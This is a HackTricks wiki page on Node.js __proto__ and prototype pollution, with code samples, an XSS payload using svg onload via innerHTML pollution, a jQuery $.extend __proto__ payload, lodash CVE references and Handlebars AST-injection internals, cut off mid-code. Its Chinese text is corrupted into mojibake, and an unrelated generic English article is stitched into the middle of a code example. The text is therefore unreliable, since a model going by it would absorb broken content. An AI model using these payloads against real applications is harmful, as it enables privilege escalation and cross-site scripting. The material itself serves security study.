# NodeJS - \_\_proto\_\_å’ŒåŸå‹æ±¡æŸ“

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## JavaScriptä¸­çš„å¯¹è±¡ <a href="#053a" id="053a"></a>

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦äº†è§£JavaScriptä¸­çš„`Object`ã€‚å¯¹è±¡æ˜¯ä¸€ç»„é”®å€¼å¯¹çš„é›†åˆï¼Œé€šå¸¸ç§°ä¸ºå¯¹è±¡çš„å±æ€§ã€‚ä¾‹å¦‚ï¼š

![](<../../../.gitbook/assets/image (389) (1).png>)

åœ¨JavaScriptä¸­ï¼Œ`Object`æ˜¯ä¸€ä¸ªåŸºæœ¬å¯¹è±¡ï¼Œç”¨äºåˆ›å»ºæ‰€æœ‰æ–°åˆ›å»ºçš„å¯¹è±¡çš„æ¨¡æ¿ã€‚å¯ä»¥é€šè¿‡å°†`null`ä¼ é€’ç»™`Object.create`æ¥åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ã€‚ç„¶è€Œï¼Œæ–°åˆ›å»ºçš„å¯¹è±¡ä¹Ÿå°†å…·æœ‰ä¸ä¼ é€’çš„å‚æ•°ç›¸å¯¹åº”çš„ç±»å‹ï¼Œå¹¶ç»§æ‰¿æ‰€æœ‰åŸºæœ¬å±æ€§ã€‚
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

ä¹‹å‰æˆ‘ä»¬å­¦åˆ°ï¼ŒJavaScriptä¸­çš„å¯¹è±¡æ˜¯é”®å€¼å¯¹çš„é›†åˆï¼Œæ‰€ä»¥ä¸€ä¸ª`null`å¯¹è±¡å°±æ˜¯ä¸€ä¸ªç©ºå­—å…¸ï¼š`{}`

## JavaScriptä¸­çš„å‡½æ•°/ç±» <a href="#55dd" id="55dd"></a>

åœ¨JavaScriptä¸­ï¼Œç±»å’Œå‡½æ•°çš„æ¦‚å¿µæ˜¯ç›¸äº’å…³è”çš„ï¼ˆå‡½æ•°æœ¬èº«å……å½“ç±»çš„æ„é€ å‡½æ•°ï¼Œè€Œå®é™…ä¸ŠJavaScriptæ²¡æœ‰â€œç±»â€çš„æ¦‚å¿µï¼‰ã€‚è®©æˆ‘ä»¬çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)

# Node.js Proto Prototype Pollution

## Introduction

Prototype pollution is a vulnerability that occurs when an attacker can modify the prototype of an object and thereby manipulate the behavior of the target application. This vulnerability can lead to various security issues, such as remote code execution, denial of service, or data manipulation.

Node.js, being a popular runtime environment for JavaScript, is also susceptible to prototype pollution attacks. In this guide, we will explore the concept of prototype pollution in Node.js and discuss various techniques to exploit this vulnerability.

## Table of Contents

- [Understanding Prototype Pollution](#understanding-prototype-pollution)
- [Exploiting Prototype Pollution in Node.js](#exploiting-prototype-pollution-in-nodejs)
  - [Polluting the Prototype](#polluting-the-prototype)
  - [Exploiting the Polluted Prototype](#exploiting-the-polluted-prototype)
- [Preventing Prototype Pollution](#preventing-prototype-pollution)
- [Conclusion](#conclusion)

## Understanding Prototype Pollution

Prototype pollution occurs when an attacker can modify the prototype of an object. In JavaScript, objects are created based on prototypes, which act as blueprints for creating new objects. By modifying the prototype, an attacker can introduce malicious properties or methods that will be inherited by all objects created from that prototype.

This vulnerability can be exploited in various ways, depending on the context and the specific behavior of the target application. Some common attack scenarios include:

- Modifying built-in JavaScript objects, such as `Object`, `Array`, or `Function`.
- Manipulating the behavior of third-party libraries or modules.
- Injecting malicious code into the application's execution flow.

## Exploiting Prototype Pollution in Node.js

Node.js applications are also vulnerable to prototype pollution attacks. In this section, we will explore how an attacker can exploit prototype pollution in a Node.js application.

### Polluting the Prototype

To exploit prototype pollution in Node.js, an attacker needs to find a vulnerable function that allows modifying the prototype of an object. This can be achieved by identifying user-controlled input that is directly used to extend an object's prototype.

Once the vulnerable function is identified, the attacker can craft a payload that modifies the prototype of an object. This payload typically includes a property with a specially crafted name and value that will be added to the object's prototype.

### Exploiting the Polluted Prototype

After successfully polluting the prototype, the attacker can trigger the exploitation by performing actions that rely on the polluted behavior. This can include calling functions or methods that use the polluted object, or manipulating the application's flow to execute the malicious code introduced through prototype pollution.

The impact of the exploitation depends on the specific context and behavior of the target application. It can range from remote code execution to denial of service or data manipulation.

## Preventing Prototype Pollution

To prevent prototype pollution attacks in Node.js applications, it is important to follow secure coding practices and implement proper input validation and sanitization. Here are some recommendations to mitigate the risk of prototype pollution:

- Avoid using user-controlled input to extend an object's prototype.
- Implement strict input validation and sanitization to prevent malicious input from being processed.
- Regularly update and patch third-party libraries to ensure they are not vulnerable to prototype pollution.
- Use security tools and frameworks that can detect and prevent prototype pollution vulnerabilities.

## Conclusion

Prototype pollution is a serious vulnerability that can lead to various security issues in Node.js applications. By understanding the concept of prototype pollution and implementing proper security measures, developers can mitigate the risk of exploitation and ensure the integrity and security of their applications.
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScriptä¸­çš„åŸå‹ <a href="#3843" id="3843"></a>

éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œåœ¨æ‰§è¡Œä»£ç æ—¶ï¼ŒåŸå‹å±æ€§å¯ä»¥è¢«æ›´æ”¹/ä¿®æ”¹/åˆ é™¤ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åŠ¨æ€æ·»åŠ ç±»çš„å‡½æ•°ï¼š

![](<../../../.gitbook/assets/image (363).png>)

ç±»çš„å‡½æ•°ä¹Ÿå¯ä»¥è¢«ä¿®æ”¹ï¼ˆä¾‹å¦‚`toString`æˆ–`valueOf`çš„ä»¥ä¸‹æƒ…å†µï¼‰ï¼š

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## ç»§æ‰¿

åœ¨åŸºäºåŸå‹çš„ç¨‹åºä¸­ï¼Œå¯¹è±¡ä»ç±»ä¸­ç»§æ‰¿å±æ€§/æ–¹æ³•ã€‚è¿™äº›ç±»æ˜¯é€šè¿‡å°†å±æ€§/æ–¹æ³•æ·»åŠ åˆ°å¦ä¸€ä¸ªç±»çš„å®ä¾‹æˆ–å°†å®ƒä»¬æ·»åŠ åˆ°ç©ºå¯¹è±¡ä¸­æ¥æ´¾ç”Ÿçš„ã€‚

è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨å‘ç”¨ä½œä¸€ç»„å¯¹è±¡çš„åŸå‹çš„å¯¹è±¡ï¼ˆå¦‚myPersonObjï¼‰æ·»åŠ å±æ€§ï¼Œåˆ™å®ƒä½œä¸ºåŸå‹çš„å¯¹è±¡ä¹Ÿä¼šè·å¾—æ–°å±æ€§ï¼Œä½†è¯¥å±æ€§ä¸ä¼šè¢«æ‰“å°ï¼Œé™¤éç‰¹åˆ«è°ƒç”¨ã€‚

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_æ±¡æŸ“ <a href="#0d0a" id="0d0a"></a>

æ‚¨åº”è¯¥å·²ç»äº†è§£åˆ°**JavaScriptä¸­çš„æ¯ä¸ªå¯¹è±¡åªæ˜¯é”®å€¼å¯¹çš„é›†åˆ**ï¼Œå¹¶ä¸”**æ¯ä¸ªå¯¹è±¡éƒ½ç»§æ‰¿è‡ªJavaScriptä¸­çš„Objectç±»å‹**ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœæ‚¨èƒ½å¤Ÿæ±¡æŸ“Objectç±»å‹ï¼Œ**ç¯å¢ƒä¸­çš„æ¯ä¸ªJavaScriptå¯¹è±¡éƒ½å°†è¢«æ±¡æŸ“ï¼**

è¿™ç›¸å½“ç®€å•ï¼Œæ‚¨åªéœ€è¦èƒ½å¤Ÿä¿®æ”¹ä»»æ„JavaScriptå¯¹è±¡çš„ä¸€äº›å±æ€§ï¼ˆé”®å€¼å¯¹ï¼‰ï¼Œå› ä¸ºæ¯ä¸ªå¯¹è±¡éƒ½ç»§æ‰¿è‡ªObjectï¼Œæ‰€ä»¥æ¯ä¸ªå¯¹è±¡éƒ½å¯ä»¥è®¿é—®Objectçš„ç»“æ„ã€‚
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
ä»å‰é¢çš„ä¾‹å­ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è®¿é—®Objectçš„ç»“æ„ï¼š
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
æ‰€ä»¥ï¼Œæ­£å¦‚ä¹‹å‰æåˆ°çš„ï¼Œå¦‚æœç°åœ¨å‘å¯¹è±¡æ–¹æ¡ˆä¸­æ·»åŠ äº†ä¸€ä¸ªå±æ€§ï¼Œæ¯ä¸ªJavaScriptå¯¹è±¡éƒ½å°†å¯ä»¥è®¿é—®åˆ°è¿™ä¸ªæ–°å±æ€§ï¼š
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
æ‰€ä»¥ç°åœ¨æ¯ä¸ªJSå¯¹è±¡éƒ½å°†åŒ…å«æ–°çš„å±æ€§ï¼šå‡½æ•°`printHello`å’Œæ–°çš„å¸¸é‡`globalconstant`

## åŸå‹æ±¡æŸ“

è¿™ç§æŠ€æœ¯ä¸åƒä¹‹å‰çš„é‚£ç§æœ‰æ•ˆï¼Œå› ä¸ºä½ æ— æ³•æ±¡æŸ“JSå¯¹è±¡çš„ç»“æ„ã€‚ä½†æ˜¯åœ¨ç¦æ­¢ä½¿ç”¨å…³é”®å­—`__proto__`çš„æƒ…å†µä¸‹ï¼Œè¿™ç§æŠ€æœ¯å¯ä»¥å¾ˆæœ‰ç”¨ã€‚

å¦‚æœä½ èƒ½å¤Ÿä¿®æ”¹å‡½æ•°çš„å±æ€§ï¼Œä½ å¯ä»¥ä¿®æ”¹å‡½æ•°çš„`prototype`å±æ€§ï¼Œ**åœ¨è¿™é‡Œæ·»åŠ çš„æ¯ä¸ªæ–°å±æ€§éƒ½å°†è¢«ä»è¯¥å‡½æ•°åˆ›å»ºçš„æ¯ä¸ªå¯¹è±¡ç»§æ‰¿ï¼š**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåªæœ‰ä»`person`ç±»åˆ›å»ºçš„**å¯¹è±¡**ä¼šå—åˆ°å½±å“ï¼Œä½†å®ƒä»¬æ¯ä¸ªéƒ½ä¼šç»§æ‰¿`sayHello`å’Œ`newConstant`å±æ€§ã€‚

**æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥æ»¥ç”¨åŸå‹æ±¡æŸ“æ¥æ±¡æŸ“æ¯ä¸ªJSå¯¹è±¡ã€‚**

ç¬¬ä¸€ç§æ–¹æ³•æ˜¯æ±¡æŸ“**Object**çš„åŸå‹å±æ€§ï¼ˆæ­£å¦‚ä¹‹å‰æåˆ°çš„ï¼Œæ¯ä¸ªJSå¯¹è±¡éƒ½ç»§æ‰¿è‡ªå®ƒï¼‰ï¼š
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
å¦‚æœä½ æˆåŠŸåšåˆ°è¿™ä¸€ç‚¹ï¼Œæ¯ä¸ªJSå¯¹è±¡éƒ½å°†èƒ½å¤Ÿæ‰§è¡Œå‡½æ•°`sayBye`ã€‚

å¦ä¸€ç§æ–¹æ³•æ˜¯æ±¡æŸ“å­—å…¸å˜é‡çš„æ„é€ å‡½æ•°çš„åŸå‹ï¼Œå°±åƒä¸‹é¢çš„ä¾‹å­ä¸­æ‰€ç¤ºï¼š
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
åœ¨æ‰§è¡Œè¯¥ä»£ç åï¼Œ**æ¯ä¸ªJSå¯¹è±¡éƒ½å°†èƒ½å¤Ÿæ‰§è¡Œå‡½æ•°`sayHey`**ã€‚

## æ±¡æŸ“å…¶ä»–å¯¹è±¡

### ä»ç±»åˆ°Object.prototype

åœ¨ä¸€ä¸ªä½ å¯ä»¥**æ±¡æŸ“ç‰¹å®šå¯¹è±¡**å¹¶ä¸”éœ€è¦**è®¿é—®`Object.prototype`**çš„åœºæ™¯ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç è¿›è¡Œæœç´¢ï¼š
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### æ•°ç»„å…ƒç´ æ±¡æŸ“

è¯·æ³¨æ„ï¼Œç”±äºæ‚¨å¯ä»¥åœ¨JSä¸­æ±¡æŸ“å¯¹è±¡çš„å±æ€§ï¼Œå¦‚æœæ‚¨å¯ä»¥æ±¡æŸ“ä¸€ä¸ªæ•°ç»„ï¼Œæ‚¨ä¹Ÿå¯ä»¥é€šè¿‡ç´¢å¼•è®¿é—®å¹¶æ±¡æŸ“æ•°ç»„çš„å€¼ï¼ˆè¯·æ³¨æ„ï¼Œæ‚¨æ— æ³•è¦†ç›–å€¼ï¼Œå› æ­¤æ‚¨éœ€è¦æ±¡æŸ“æŸç§ç¨‹åº¦ä¸Šè¢«ä½¿ç”¨ä½†æœªè¢«å†™å…¥çš„ç´¢å¼•ï¼‰ã€‚
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### HTMLå…ƒç´ æ±¡æŸ“

é€šè¿‡JSç”ŸæˆHTMLå…ƒç´ æ—¶ï¼Œå¯ä»¥é€šè¿‡**è¦†ç›–** **`innerHTML`** å±æ€§æ¥ç¼–å†™**ä»»æ„çš„HTMLä»£ç **ã€‚[è¿™ç¯‡æ–‡ç« çš„æƒ³æ³•å’Œç¤ºä¾‹](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)ã€‚

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## ç¤ºä¾‹

### åŸºæœ¬ç¤ºä¾‹

é‚£ä¹ˆåŸå‹æ±¡æŸ“åœ¨å“ªé‡Œå‘¢ï¼Ÿå½“åº”ç”¨ç¨‹åºå­˜åœ¨é”™è¯¯æ—¶ï¼Œå¯ä»¥è¦†ç›–`Object.prototype`çš„å±æ€§ï¼Œä»è€Œå¯¼è‡´åŸå‹æ±¡æŸ“ã€‚ç”±äºæ¯ä¸ªå…¸å‹å¯¹è±¡éƒ½ä»`Object.prototype`ç»§æ‰¿å…¶å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹å˜åº”ç”¨ç¨‹åºçš„è¡Œä¸ºã€‚æœ€å¸¸è§çš„ç¤ºä¾‹æ˜¯ä»¥ä¸‹å†…å®¹ï¼š
```javascript
if (user.isAdmin) {   // do something important!}
```
å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåŸå‹æ±¡æŸ“ï¼Œå¯ä»¥è®¾ç½®`Object.prototype.isAdmin = true`ã€‚é‚£ä¹ˆï¼Œé™¤éåº”ç”¨ç¨‹åºæ˜ç¡®åˆ†é…äº†ä»»ä½•å€¼ï¼Œå¦åˆ™`user.isAdmin`å§‹ç»ˆä¸ºtrueï¼

ä¾‹å¦‚ï¼Œ`obj[a][b] = value`ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶`a`å’Œ`value`çš„å€¼ï¼Œé‚£ä¹ˆä»–åªéœ€è¦å°†`a`çš„å€¼è°ƒæ•´ä¸º`__proto__`ï¼ˆåœ¨JavaScriptä¸­ï¼Œ`obj["__proto__"]`å’Œ`obj.__proto__`æ˜¯å®Œå…¨ç­‰ä»·çš„ï¼‰ï¼Œç„¶ååº”ç”¨ç¨‹åºä¸­æ‰€æœ‰ç°æœ‰å¯¹è±¡çš„å±æ€§`b`å°†è¢«åˆ†é…ä¸º`value`ã€‚

ç„¶è€Œï¼Œæ”»å‡»å¹¶ä¸åƒä¸Šé¢çš„é‚£ä¸ªç®€å•ï¼Œæ ¹æ®[è®ºæ–‡](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf)æ‰€è¿°ï¼Œåªæœ‰æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶ä¹‹ä¸€æ—¶ï¼Œæˆ‘ä»¬æ‰èƒ½è¿›è¡Œæ”»å‡»ï¼š

* æ‰§è¡Œé€’å½’åˆå¹¶
* é€šè¿‡è·¯å¾„å®šä¹‰å±æ€§
* å…‹éš†å¯¹è±¡

### è¦†ç›–å‡½æ•°
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Protoæ±¡æŸ“åˆ°RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## å®¢æˆ·ç«¯åŸå‹æ±¡æŸ“åˆ°XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019â€“11358: é€šè¿‡jQuery $ .extendè¿›è¡ŒåŸå‹æ±¡æŸ“æ”»å‡»

å¦‚æœå¤„ç†ä¸å½“ï¼Œ$ .extendå¯ä»¥æ›´æ”¹å¯¹è±¡`prototype`ï¼ˆåº”ç”¨ç¨‹åºä¸­å¯¹è±¡çš„æ¨¡æ¿ï¼‰çš„å±æ€§ã€‚ç„¶åï¼Œè¯¥å±æ€§å°†å‡ºç°åœ¨æ‰€æœ‰å¯¹è±¡ä¸Šã€‚è¯·æ³¨æ„ï¼Œåªæœ‰$ .extendçš„â€œæ·±å±‚â€ç‰ˆæœ¬ï¼ˆå³gï¼‰å—åˆ°å½±å“ã€‚

ç¨‹åºå‘˜ç»å¸¸ä½¿ç”¨æ­¤å‡½æ•°æ¥å¤åˆ¶å¯¹è±¡æˆ–ä»é»˜è®¤å¯¹è±¡ä¸­å¡«å……æ–°å±æ€§ã€‚ä¾‹å¦‚ï¼š

æˆ‘ä»¬å¯ä»¥æƒ³è±¡`myObject`æ˜¯æ¥è‡ªç”¨æˆ·çš„è¾“å…¥å­—æ®µï¼Œå¹¶å°†å…¶åºåˆ—åŒ–åˆ°æ•°æ®åº“ä¸­ã€‚

åœ¨è¿™æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸è®¤ä¸ºåœ¨è¿è¡Œæ—¶å°†å±æ€§`isAdmin`åˆ†é…ç»™æ–°åˆ›å»ºçš„å¯¹è±¡ã€‚ä½†å®é™…ä¸Šï¼Œå®ƒç›´æ¥åˆ†é…ç»™`{}`ï¼Œç„¶å`{}.isAdmin`å°†ä¸º`true`ã€‚å¦‚æœåœ¨æ­¤ä»£ç ä¹‹åï¼Œæˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹æ£€æŸ¥ï¼š
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
å¦‚æœç”¨æˆ·å°šä¸å­˜åœ¨ï¼ˆ`undefined`ï¼‰ï¼Œåˆ™å°†åœ¨å…¶çˆ¶å¯¹è±¡ä¸­æœç´¢å±æ€§`isAdmin`ï¼Œè¯¥çˆ¶å¯¹è±¡æ˜¯åœ¨ä¸Šé¢æ·»åŠ äº†å€¼ä¸º`true`çš„`isAdmin`çš„å¯¹è±¡ã€‚

åœ¨JQuery 3.3.1ä¸Šæ‰§è¡Œçš„å¦ä¸€ä¸ªç¤ºä¾‹ï¼š
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
è¿™äº›é”™è¯¯å¯èƒ½ä¼šå½±å“å¾ˆå¤šJavaScripté¡¹ç›®ï¼Œå°¤å…¶æ˜¯NodeJSé¡¹ç›®ï¼Œæœ€å®é™…çš„ä¾‹å­æ˜¯åœ¨2018å¹´12æœˆå‘ç”Ÿçš„Mongooseé”™è¯¯ï¼Œè¿™æ˜¯ä¸€ä¸ªå¸®åŠ©æ“ä½œMongoDBçš„JSåº“ã€‚

### CVE-2018â€“3721, CVE-2019â€“10744: é€šè¿‡lodashè¿›è¡ŒåŸå‹æ±¡æŸ“æ”»å‡»

[Lodash](https://www.npmjs.com/package/lodash)ä¹Ÿæ˜¯ä¸€ä¸ªä¼—æ‰€å‘¨çŸ¥çš„åº“ï¼Œæä¾›äº†è®¸å¤šä¸åŒçš„å‡½æ•°ï¼Œå¸®åŠ©æˆ‘ä»¬æ›´æ–¹ä¾¿ã€æ›´æ•´æ´åœ°ç¼–å†™ä»£ç ï¼Œæ¯å‘¨ä¸‹è½½é‡è¶…è¿‡1900ä¸‡æ¬¡ã€‚å®ƒä¹Ÿé‡åˆ°äº†ä¸JQueryç›¸åŒçš„é—®é¢˜ã€‚

**CVE-2018â€“3721**

**CVE-2019â€“10744**

è¿™ä¸ªæ¼æ´å½±å“äº†æ‰€æœ‰ç‰ˆæœ¬çš„Lodashï¼Œåœ¨4.17.11ç‰ˆæœ¬ä¸­å·²ç»ä¿®å¤ã€‚

### å¦ä¸€ä¸ªå¸¦æœ‰CVEçš„æ•™ç¨‹

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## ASTåŸå‹æ±¡æŸ“

åœ¨NodeJSä¸­ï¼ŒASTåœ¨JSä¸­ç»å¸¸è¢«ä½¿ç”¨ï¼Œæ¯”å¦‚æ¨¡æ¿å¼•æ“å’ŒTypeScriptç­‰ã€‚\
å¯¹äºæ¨¡æ¿å¼•æ“ï¼Œç»“æ„å¦‚ä¸Šå›¾æ‰€ç¤ºã€‚

![img](https://blog.p6.is/img/2020/08/graph\_3.jpg)

### Handlebars

ä¿¡æ¯æ¥è‡ª[https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

æ‚¨å¯ä»¥å°†ä»»ä½•å­—ç¬¦ä¸²æ’å…¥åˆ°`Object.prototype.pendingContent`ä¸­ï¼Œä»¥ç¡®å®šæ˜¯å¦å­˜åœ¨æ”»å‡»çš„å¯èƒ½æ€§ã€‚\
è¿™æ ·å¯ä»¥ç¡®ä¿åœ¨é»‘ç›’ç¯å¢ƒä¸­å­˜åœ¨åŸå‹æ±¡æŸ“æ—¶ï¼ŒæœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨handlebarså¼•æ“ã€‚
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
if (this.pendingContent) {
content = this.pendingContent + content;
} else {
this.pendingLocation = this.source.currentLocation;
}

this.pendingContent = content;
},
pushSource: function pushSource(source) {
if (this.pendingContent) {
this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
this.pendingContent = undefined;
}

if (source) {
this.source.push(source);
}
}
...
```
è¿™æ˜¯`javascript-compiler.js`æ–‡ä»¶ä¸­çš„`appendContent`å‡½æ•°å®ç°çš„ã€‚`appendContent`å‡½æ•°çš„åŠŸèƒ½æ˜¯ï¼Œå¦‚æœ`pendingContent`å­˜åœ¨ï¼Œåˆ™å°†å…¶é™„åŠ åˆ°å†…å®¹ä¸­å¹¶è¿”å›ã€‚

`pushSource`å‡½æ•°å°†`pendingContent`è®¾ç½®ä¸º`undefined`ï¼Œä»¥é˜²æ­¢å­—ç¬¦ä¸²è¢«å¤šæ¬¡æ’å…¥ã€‚

**åˆ©ç”¨æ–¹æ³•**

![img](https://blog.p6.is/img/2020/08/graph\_5.jpg)

å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒHandlebarsçš„å·¥ä½œåŸç†ã€‚

åœ¨è¯æ³•åˆ†æå™¨å’Œè§£æå™¨ç”ŸæˆASTä¹‹åï¼ŒASTä¼šä¼ é€’ç»™`compiler.js`ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›å‚æ•°è¿è¡Œç¼–è¯‘å™¨ç”Ÿæˆçš„æ¨¡æ¿å‡½æ•°ï¼Œå¹¶ä¸”å®ƒä¼šè¿”å›ç±»ä¼¼äºâ€œHello posixâ€çš„å­—ç¬¦ä¸²ï¼ˆå½“msgä¸ºposixæ—¶ï¼‰ã€‚
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
break;
```
handlebarsä¸­çš„è§£æå™¨é€šè¿‡Numberæ„é€ å‡½æ•°å¼ºåˆ¶å°†ç±»å‹ä¸ºNumberLiteralçš„èŠ‚ç‚¹çš„å€¼å§‹ç»ˆä¸ºæ•°å­—ã€‚ç„¶è€Œï¼Œæ‚¨å¯ä»¥ä½¿ç”¨åŸå‹æ±¡æŸ“åœ¨æ­¤å¤„æ’å…¥ä¸€ä¸ªéæ•°å­—å­—ç¬¦ä¸²ã€‚
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
// Just return if an already-compiled AST was passed in.
if (input.type === 'Program') {
return input;
}

_parser2['default'].yy = yy;

// Altering the shared object here, but this is ok as parser is a sync operation
yy.locInfo = function (locInfo) {
return new yy.SourceLocation(options && options.srcName, locInfo);
};

var ast = _parser2['default'].parse(input);

return ast;
}

function parse(input, options) {
var ast = parseWithoutProcessing(input, options);
var strip = new _whitespaceControl2['default'](options);

return strip.accept(ast);
}
```
é¦–å…ˆï¼Œçœ‹ä¸€ä¸‹ç¼–è¯‘å‡½æ•°ï¼Œå®ƒæ”¯æŒä¸¤ç§è¾“å…¥æ–¹å¼ï¼ŒAST å¯¹è±¡å’Œæ¨¡æ¿å­—ç¬¦ä¸²ã€‚

å½“è¾“å…¥çš„ç±»å‹æ˜¯ `Program` æ—¶ï¼Œå°½ç®¡å®é™…ä¸Šè¾“å…¥çš„å€¼æ˜¯å­—ç¬¦ä¸²ã€‚\
è§£æå™¨è®¤ä¸ºå®ƒå·²ç»ç”± parser.js è§£ææˆ ASTï¼Œå¹¶å°†å…¶ç›´æ¥å‘é€ç»™ç¼–è¯‘å™¨ï¼Œæ— éœ€è¿›è¡Œä»»ä½•å¤„ç†ã€‚
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
